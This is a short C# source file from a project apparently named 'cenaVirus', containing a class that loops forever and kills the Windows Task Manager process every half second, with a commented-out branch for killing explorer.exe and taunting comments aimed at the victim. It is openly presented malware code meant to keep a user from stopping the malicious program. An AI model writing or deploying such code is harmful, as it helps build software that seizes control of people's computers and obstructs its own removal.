using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;


namespace cenaVirus
{
    class taskProcKill
    {
        //Kill Processes
        public void procKiller()
        {
            while (true)
            {
                foreach (Process Proc in Process.GetProcesses())
                {
                    if (Proc.ProcessName.Equals("Taskmgr"))  //Nah, You don't get the privilage.
                    {
                        try
                        {
                            Proc.Kill();
                        }
                        catch (Exception)
                        { }
                    }
                    if (Proc.ProcessName.Equals("explorer"))  //Who needs explorer.exe anyway?
                    {
                        try
                        {
                         //   Proc.Kill();
                        }
                        catch(Exception)
                        { }
                    }
                }
                System.Threading.Thread.Sleep(500);
            }
        }
    }
}
